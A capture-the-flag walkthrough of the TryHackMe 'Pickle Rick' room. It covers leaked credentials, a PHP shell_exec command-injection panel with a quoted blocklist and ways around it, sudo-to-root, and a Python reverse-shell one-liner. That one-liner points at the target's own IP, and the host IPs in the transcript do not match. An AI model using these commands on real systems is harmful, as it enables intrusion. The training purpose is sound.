---
title: "Pickle Rick"
description: "A Rick and Morty themed box where a username hides in an HTML comment, a password hides in robots.txt, and the login-protected command panel runs shell_exec with a blocklist so short that less and tac walk straight through it. Then passwordless sudo on www-data finishes the job."
difficulty: "Easy"
tags: ["Web Enumeration", "Gobuster", "robots.txt", "Information Disclosure", "OS Command Injection", "Blocklist Bypass", "Sudo", "Privilege Escalation"]
date: "2026-03-31"
---

## Overview

Pickle Rick is a beginner box with a sense of humour, and it is worth writing up precisely because the humour hides how well it teaches the two lessons beginners get wrong.

The first lesson is where credentials live. There is no database, no password hashing, and no `admin:admin` — the username is in an HTML comment on the home page and the password is the entire content of `robots.txt`. Both are things a scanner will not flag and a person only finds by looking.

The second lesson is about filters. The application's command panel genuinely tries to stop you from reading files: it inspects the submitted command against a blocklist and refuses anything containing `cat`, `head`, `more`, `tail`, `nano`, `vim`, or `vi`. Seven words against a whole operating system is not a control, and the room is a compact demonstration of why blocklists fail — the blocked list omits `less`, `tac`, `nl`, `strings`, and the shell itself, and `less` alone is enough to read every file on the box.

The chain is therefore: leaked username → leaked password → authenticated command execution as `www-data` → three ingredient files → passwordless `sudo` → root.

![Rick and Morty artwork served from the application's assets directory](/assets/screenshots/picklerick/rickandmorty.jpeg)

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Category:** boot2root
- **Operating System:** Ubuntu 20.04 (Apache 2.4.41, OpenSSH 8.2p1)
- **Skills Learned:** HTML source review, `robots.txt` as a hiding place, extension-aware directory brute-forcing, recognising `shell_exec` command injection, blocklist bypass, `sudo` enumeration and abuse
- **Objective:** Recover the three "ingredients" Rick needs for his potion

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt 10.48.173.153
```

```text
# Nmap 7.95 scan initiated Tue Mar 31 13:07:57 2026 as: /usr/lib/nmap/nmap -sV -sC -oN nmap.txt 10.48.173.153
Nmap scan report for 10.48.173.153
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:93:2b:c1:b9:5b:c3:95:56:85:6d:c7:d9:1f:e4:5d (RSA)
|   256 33:0c:47:5f:98:74:8b:e8:fd:06:b6:c8:ce:f6:ce:56 (ECDSA)
|_  256 97:d5:55:b6:be:19:b2:af:12:53:16:ca:c2:7d:fa:2a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![Basic Nmap scan showing ports 22 and 80](/assets/screenshots/picklerick/01-nmap-scan.png)

Two ports, and only one of them is a candidate:

| Port | Service | Observation |
|------|---------|-------------|
| 22/tcp | SSH | OpenSSH 8.2p1 on Ubuntu — no credentials, and nothing to try yet |
| 80/tcp | Apache 2.4.41 | A single web application titled "Rick is sup4r cool" |

The version pair (Apache 2.4.41, OpenSSH 8.2p1) points at Ubuntu 20.04. That matters a little later because it tells you which utilities exist — `less`, `tac`, and `nl` will all be present, and busybox-style minimal images are not a concern.

There is no point attacking SSH. The web application is the only thing that offers an input, so that is where the whole box lives.

### Directory Enumeration

```bash
gobuster dir -u http://10.48.173.153 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

The `-x php,html,txt` flag is the part that actually matters. Without it, `gobuster` only asks for directories and extensionless paths, and this application keeps its logic in `.php` files — `login.php`, `portal.php`, `denied.php` would all be missed. Supplying likely extensions turns a handful of hits into the entire attack surface.

```text
===============================================================
[+] Url:            http://10.48.173.153/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Timeout:        10s
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
```

That run alone finds `/assets/` and `/robots.txt` but none of the application's logic. Repeating it with `-x php,html,txt` adds the files that matter:

```text
/login.php (Status: 200)
/portal.php (Status: 302)
/denied.php (Status: 302)
```

![Gobuster directory enumeration results](/assets/screenshots/picklerick/03-gobuster-results.png)

| Path | Status | Meaning |
|------|--------|---------|
| `/` and `/index.html` | 200 | The Rick and Morty landing page |
| `/assets/` | 301 | Static files — CSS, JS, images |
| `/login.php` | 200 | A login form |
| `/portal.php` | 302 | Redirects to `login.php`, which means it requires a session |
| `/denied.php` | 302 | Also requires a session — the "wrong Rick" page |
| `/robots.txt` | 200 | Normally crawler directives. Hold that thought |
| `/server-status` | 403 | Apache's status handler exists but is not readable |

The `302` on `portal.php` is the most informative line in the output. A direct `200` would be an open page; a redirect to the login form tells you there is something behind authentication worth having. That is the target.

## Initial Access

### Step 1 — A username in an HTML comment

The landing page renders Rick and Morty artwork and very little else, so the interesting content is in the source:

```bash
curl -s http://10.48.173.153/ | grep -i -A2 -B2 "username\|<!--"
```

```html
<!--
  Note to self:
  Username: R1ckRul3s
-->
```

![Username disclosed in an HTML comment](/assets/screenshots/picklerick/02-html-source-username.png)

HTML comments are shipped to every visitor and removed by the browser before rendering, which makes them invisible to the person browsing the site and perfectly visible to anyone who presses `Ctrl+U`. Usernames in comments are one of the oldest findings in web security and still one of the most common — developers leave notes for themselves and forget that the note is a public document.

The same page also contains a base64 blob that decodes, after several rounds, to the string `rabbit hole`:

```bash
echo 'Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==' \
  | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
```

```text
rabbit hole
```

That is a deliberate decoy — the room telling you, politely, that not every encoded string is a clue. Worth recognising, because a lot of time gets spent on the wrong artefact when the real answer was a plain comment two lines above it.

### Step 2 — A password in robots.txt

`robots.txt` is supposed to tell crawlers what not to index. This one contains nothing but a single word:

```bash
curl -s http://10.48.173.153/robots.txt
```

```text
Wubbalubbadubdub
```

![robots.txt containing the password candidate](/assets/screenshots/picklerick/04-robots-txt.png)

Two observations make this more than a joke:

1. **It is not a valid `robots.txt`.** A real file begins with `User-agent:` and lists `Disallow:` paths. A bare string is ignored by every compliant crawler, so it protects nothing. It is being used as a place to store a secret, and robots files are world-readable by design.
2. **`robots.txt` is the first file anyone checks.** It is in every wordlist, every scanner's default set, and this room's `gobuster` output. "Hidden from search engines" is not hidden.

The word is Rick's catchphrase, which makes it a memorable password and a terrible one. Combined with the username from the comment, that is a complete credential pair.

### Step 3 — Logging into the command panel

`login.php` is a single username and a single password field. Submitting `R1ckRul3s` / `Wubbalubbadubdub` returns a session cookie and redirects to `portal.php`.

![Credentials entered on the portal login page](/assets/screenshots/picklerick/05-login-page.png)

![portal.jpg, an image the application serves from its assets directory](/assets/screenshots/picklerick/portal.jpg)

The panel itself is a Bootstrap page with one text box and one **Execute** button. It is not a normal administration interface — it is a thin wrapper over the operating system. The PHP behind it is short enough to be worth reading:

```php
<?php
session_start();
if($_SESSION["login"] == false) {
    header("Location: /login.php");
    die();
}
// ...
if(isset($_POST["command"])) {
    $cmds = array("cat", "head", "more", "tail", "nano", "vim", "vi");
    if(contains($_POST["command"], $cmds)) {
        echo "<br><p><u>Command disabled</u> to make it hard for future
              <b>PICKLEEEE RICCCKKKK</b>.</p><img src='assets/fail.gif'>";
    } else {
        $output = shell_exec($_POST["command"]);
        echo "<br><pre>$output</pre>";
    }
}
?>
```

Three things follow from those ten lines:

- **`shell_exec()` receives the POST body directly.** No escaping, no allowlist, no argument separation. This is a web shell with a login page in front of it.
- **Authentication is a single hardcoded account.** The login code compares against the literal strings `R1ckRul3s` and `Wubbalubbadubdub` — there is no user table and no hashing, so there is no way to rotate the password and nothing to brute-force beyond one guess.
- **The only defence is a substring blocklist** of seven commands.

### Step 4 — Bypassing the blocklist

The blocklist is `array("cat", "head", "more", "tail", "nano", "vim", "vi")`. Typing `cat Sup3rS3cretPickl3Ingred.txt` returns the `fail.gif` page instead of the file.

The first thing to notice is that the list is compared with a substring match, so it is simultaneously too broad and too narrow. It blocks any command *containing* one of those words — `concat` would be rejected even though it is harmless — and yet it names only seven binaries out of the hundreds that can read a file.

Replacing `cat` with `less` is enough:

```bash
ls
less Sup3rS3cretPickl3Ingred.txt
```

Every alternative below does the same job:

| Blocked | Working alternative |
|---------|--------------------|
| `cat file` | `less file`, `tac file`, `nl file` |
| `cat file` | `strings file`, `sed -n '1p' file`, `awk '{print}' file` |
| `cat file` | `php -r 'echo file_get_contents("file");'` |
| `head` / `tail` | `sed -n '1,10p' file`, `less file` |

A useful side note: plenty of writeups for this room claim that `less` is blocked. It is not — the array has no `less` in it. Reading the source instead of trusting a writeup is the difference between being stuck and being finished, and here the source is available from the box itself once you have any command execution.

### Step 5 — The first ingredient

The web root is the current working directory for the panel, so `ls` lists the application's own files:

```text
assets  clue.txt  denied.php  index.html  login.php  portal.php
robots.txt  Sup3rS3cretPickl3Ingred.txt
```

![Listing the files in the web directory](/assets/screenshots/picklerick/06-web-directory-listing.png)

```bash
less Sup3rS3cretPickl3Ingred.txt
```

```text
mr. meeseek hair
```

![Contents of Sup3rS3cretPickl3Ingred.txt](/assets/screenshots/picklerick/07-first-ingredient.png)

There is also a `clue.txt`, which says to look around the file system for the other ingredients — the room being helpful rather than cryptic. Note the significance of the location: the file sits in `/var/www/html`, the directory the web server owns. Any compromise of the web application reaches it, which is why secrets should never be stored next to the code that is allowed to read them.

### Step 6 — The second ingredient

```bash
ls /home
```

```text
rick
ubuntu
```

```bash
ls /home/rick
```

```text
second ingredients
```

```bash
less "/home/rick/second ingredients"
```

```text
1 jerry tear
```

![Contents of the second ingredients file in /home/rick](/assets/screenshots/picklerick/11-second-ingredient.png)

The filename contains a space, which breaks naive command construction — `cat second ingredients` becomes two arguments and the shell reports "No such file or directory" twice. Quoting the whole path, or escaping the space, fixes it. Small detail, but it is the kind of thing that makes a beginner think the file is unreadable when the shell is simply being told to open two files that do not exist.

The `rick` account also exists as a system user, which is why its home directory is in `/home` while the web server only ever needed `/var/www`. A low-privileged web account having read access to another user's home directory is an access-control problem in a real environment; here it is the intended step.

## Privilege Escalation

The panel runs commands as the web server, which needs confirming before anything else is attempted:

```bash
whoami
id
```

```text
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`www-data` owns the web root and nothing else, so `/root/3rd.txt` is unreadable at this level. The question is whether the web account has been given any way to elevate. On Linux that question has one cheap answer:

```bash
sudo -l
```

```text
Matching Defaults entries for www-data on ip-10-10-55-189:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on
        ip-10-10-55-189:
    (ALL) NOPASSWD: ALL
```

`(ALL) NOPASSWD: ALL` against the web service account is the entire privilege escalation. It says that anything the panel can run, it can also run as root, without a password. This is almost always a leftover from debugging — somebody needed `www-data` to restart a service or read a log and granted everything instead of one command.

The blocklist only inspects the submitted string, so it does not interfere: `sudo cat /root/3rd.txt` contains `cat` and is refused, but `sudo less /root/3rd.txt` does not.

```bash
sudo ls /root
```

```text
3rd.txt  snap
```

![Elevated listing of /root using sudo](/assets/screenshots/picklerick/13-root-directory.png)

```bash
sudo less /root/3rd.txt
```

```text
3rd ingredients: fleeb juice
```

![Contents of /root/3rd.txt read with sudo](/assets/screenshots/picklerick/14-third-ingredient.png)

For a proper root shell rather than one command at a time:

```bash
sudo bash -p
```

```text
root@ip-10-10-55-189:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The `-p` flag tells `bash` to keep the effective UID it was started with; with `sudo` in front, that is root. Plain `sudo bash` also works here — `-p` is the habit worth keeping, because it protects against shells that drop privileges when the real and effective UIDs differ, and it is the difference between a root shell and a `www-data` shell that merely thinks it is root.

Because the panel returns a single captured block of output, I also pushed a reverse shell through it to get an interactive TTY:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.48.173.153",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

That is a convenience, not a requirement. Command execution through the panel is already enough to read all three files; the reverse shell only makes the box comfortable to explore.

## Flags

The room's three "ingredients" are the flags. They are fixed strings rather than per-instance values, so they can be stated directly — the locations matter more, since they span three different privilege boundaries.

| # | Ingredient | Value | Location | Reached as |
|---|-----------|-------|----------|------------|
| 1 | First ingredient | `mr. meeseek hair` | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` | `www-data` |
| 2 | Second ingredient | `1 jerry tear` | `/home/rick/second ingredients` | `www-data` |
| 3 | Final ingredient | `fleeb juice` | `/root/3rd.txt` | `root` |

The progression is the point: the first file is in the web root, the second is one directory hop away into another user's home, and the third requires a root shell. Each step is a real boundary, and the `sudo` misconfiguration is what makes the last one trivial.

## Commands Used

```bash
# --- Enumeration ---
nmap -sV -sC -oN nmap.txt 10.48.173.153
gobuster dir -u http://10.48.173.153 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# --- Credentials ---
curl -s http://10.48.173.153/ | grep -i -A2 -B2 "username\|<!--"   # R1ckRul3s
curl -s http://10.48.173.153/robots.txt                            # Wubbalubbadubdub

# --- Command execution (through portal.php) ---
ls
less Sup3rS3cretPickl3Ingred.txt        # ingredient 1
ls /home
ls /home/rick
less "/home/rick/second ingredients"    # ingredient 2

# --- Privilege escalation ---
whoami
sudo -l                                 # (ALL) NOPASSWD: ALL
sudo ls /root
sudo less /root/3rd.txt                 # ingredient 3
sudo bash -p

# --- Optional interactive shell ---
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Lessons Learned

- **Comments are content.** An HTML comment reaches every visitor and is invisible in the browser, which makes it the worst of both worlds: fully public, but nobody looks. Usernames, internal hostnames, and to-do notes left in source are a consistent finding in real assessments, and `Ctrl+U` is a five-second check.
- **`robots.txt` is a public file.** It exists to be read by crawlers, it is retrieved by every scanner in existence, and a bare string in it is not even valid syntax. Secrets belong in a secret store, not in a file whose purpose is publication.
- **`shell_exec()` with user input is remote code execution, full stop.** No amount of sanitising in the UI changes that; the only safe design is not to build the panel. If a specific operation is needed, call a specific function with validated arguments.
- **Blocklists lose to the size of the system.** Seven command names against an entire operating system, with a substring match on top, produced a filter that blocks `concat` while allowing `less`. An allowlist of individual binaries with fixed arguments is the only version of this that can work — and even then the safer answer is to remove the feature.
- **Read source rather than trusting writeups.** Several public walkthroughs state that `less` is blocked on this box. It is not, and the `$cmds` array proves it. Once you have any command execution, reading the vulnerable code is cheaper than guessing, and it prevents you from discarding the one tool you need.
- **`sudo -l` is the highest-value command on any Linux host.** One line of output here replaced an entire enumeration phase. `(ALL) NOPASSWD: ALL` for a service account is a configuration error, not a hardening gap, and it collapses every boundary the box was built to teach.
- **Quoting is part of the payload.** `second ingredients` with a space is a filename, not a command. Beginner walkthroughs skip this and beginners then conclude the file does not exist. Quote the path or escape the space, and remember that the shell is doing word splitting before the program ever sees your argument.
- **Not every encoded string is a clue.** The base64 blob in the page source decodes to "rabbit hole". Learning to notice a decoy and move on is a skill; the actual answer was a plain-text comment beside it.

## References

- [TryHackMe — Pickle Rick](https://tryhackme.com/room/picklerick)
- [reikurozora — TryHackMe Pickle Rick writeup](https://github.com/reikurozora/tryhackme-pickle-rick-writeup)
- [Jasper Alblas — TryHackMe: Pickle Rick walkthrough](https://www.jalblas.com/blog/tryhackme-pickle-rick-walkthrough)
- [josephmtakai — Pickle Rick writeup (portal.php source review)](https://github.com/josephmtakai/5h3ph3rd-TryHackMe-WriteUps/blob/main/Pickle%20Rick/README.md)
- [PHP manual — `shell_exec`](https://www.php.net/manual/en/function.shell-exec.php)
- [GTFOBins — `less`](https://gtfobins.github.io/gtfobins/less/)
- [OWASP — OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP — Review Webpage Content for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage)

*Terminal screenshots are from the reikurozora walkthrough linked above, credited because no captures were kept in the original room folder. The `rickandmorty.jpeg` and `portal.jpg` files were saved directly from the target application and are reproduced here as local artefacts.*
